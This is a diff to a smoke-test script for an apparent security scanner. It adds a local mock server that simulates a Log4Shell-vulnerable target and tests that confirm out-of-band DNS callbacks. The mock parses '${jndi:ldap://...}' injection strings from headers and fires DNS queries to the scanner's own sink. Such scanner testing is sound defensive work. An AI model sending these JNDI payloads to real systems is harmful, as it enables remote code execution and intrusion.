@@ -30,8 +30,22 @@ fi
 MOCK="$(mktemp /tmp/nullock-probe-mock.XXXXXX.py)"
 cat > "$MOCK" <<'PY'
 import http.server, socketserver, sys, threading, time, json, gzip, re
-import urllib.request
+import urllib.request, socket, struct
 from urllib.parse import urlparse, parse_qs
+def fire_dns(qname, server, port):
+    # Minimal UDP A-query -- simulates a vulnerable JNDI resolver looking up the
+    # Log4Shell callback host, landing the token on Nullock's DNS sink.
+    try:
+        pkt = struct.pack('>HHHHHH', 0x1337, 0x0100, 1, 0, 0, 0)
+        for lab in qname.split('.'):
+            b = lab.encode()[:63]; pkt += struct.pack('B', len(b)) + b
+        pkt += b'\x00' + struct.pack('>HH', 1, 1)
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(2)
+        s.sendto(pkt, (server, port))
+        try: s.recvfrom(512)
+        except Exception: pass
+        s.close()
+    except Exception: pass
 def make(mode):
     state = {'spaces': 0}
     class H(http.server.BaseHTTPRequestHandler):
@@ -199,6 +213,20 @@ def make(mode):
                     wf, ferr = sinks[mode]
                     self._send(200, ok if val == wf else ferr); return  # accept own valid blob, else error
                 self._send(200, ok); return                           # deser-safe
+            if mode.startswith('oastlog4'):
+                # A Log4Shell-vulnerable server: a ${jndi:ldap://<token>.<host>:
+                # <port>/a} in a logged header triggers a JNDI lookup whose DNS
+                # resolution lands the token on our DNS sink. -safe logs inertly.
+                if mode == 'oastlog4-vuln':
+                    for hv in self.headers.values():
+                        m = re.search(r'\$\{jndi:ldap://([^/}]+)', hv)
+                        if m:
+                            hp = m.group(1)                      # <token>.<host>:<port>
+                            host = hp.split(':')[0]
+                            port = int(hp.split(':')[1]) if ':' in hp else 53
+                            server = host.split('.', 1)[1] if '.' in host else host
+                            fire_dns(host, server, port)
+                self._send(200, b'ok'); return
             if mode.startswith('oast'):
                 # A server vulnerable to the OAST blast's GET vectors: it acts on
                 # an attacker-controlled URL in a param -- whether the value is a
@@ -371,7 +399,7 @@ MODES=(sspp-vuln sspp-safe sspp-gzip
        ldap-vuln ldap-safe ldap-baseline
        xpath-vuln xpath-safe
        content-found
-       oast-vuln oast-safe
+       oast-vuln oast-safe oastlog4-vuln oastlog4-safe
        h3-adv h3-h2only h3-none h3-clear)
 MOCK_OUT="$(mktemp /tmp/nullock-probe-mock-out.XXXXXX)"
 python "$MOCK" "${MODES[@]}" > "$MOCK_OUT" 2>&1 & MOCK_PID=$!
@@ -549,6 +577,27 @@ chk "oast SSRF OOB -> callback confirmed"      "{\"v\":$(oast_battery oast-vuln 
 chk "oast blind-RCE OOB -> callback confirmed" "{\"v\":$(oast_battery oast-vuln "$RCEFLAGS")}" "d.get('v')==1"
 chk "oast blind-XXE OOB -> callback confirmed" "{\"v\":$(oast_battery oast-vuln "$XXEFLAGS")}" "d.get('v')==1"
 chk "oast safe target -> no callback"          "{\"v\":$(oast_battery oast-safe "$RCEFLAGS")}" "d.get('v')==0"
+
+# Log4Shell confirms via the DNS sink, not the HTTP sink, so assert on the
+# isolated snapshot.oast.dnsHits counter (only this mock fires DNS -> the
+# cumulative counter is safe here). A vulnerable JNDI resolver looks up the
+# callback host; a safe target makes no DNS query.
+oast_dnshits() { curl -sS "${HDR[@]}" "$BASEURL/api/snapshot" 2>/dev/null | python -c "import json,sys
+try: print(json.load(sys.stdin).get('oast',{}).get('dnsHits',0))
+except Exception: print(-1)"; }
+l4_safe_before="$(oast_dnshits)"
+post /api/oast/blast "{\"url\":\"$(url ${P[oastlog4-safe]} '')\",\"log4shell\":true,\"ssrf\":false,\"xxe\":false,\"rce\":false}" >/dev/null
+sleep 2
+chk "oast log4shell-safe -> no DNS hit"        "{\"a\":$(oast_dnshits),\"b\":$l4_safe_before}" "d.get('a')==d.get('b')"
+l4_before="$(oast_dnshits)"
+post /api/oast/blast "{\"url\":\"$(url ${P[oastlog4-vuln]} '')\",\"log4shell\":true,\"ssrf\":false,\"xxe\":false,\"rce\":false}" >/dev/null
+l4_got=0
+for _ in $(seq 1 16); do
+  now="$(oast_dnshits)"
+  if [ "$now" -gt "$l4_before" ] 2>/dev/null; then l4_got=1; break; fi
+  sleep 0.5
+done
+chk "oast log4shell DNS OOB -> callback landed" "{\"got\":$l4_got}" "d.get('got')==1"
 
 echo ""
 echo "probe_smoke: $PASS passed, $FAIL failed"
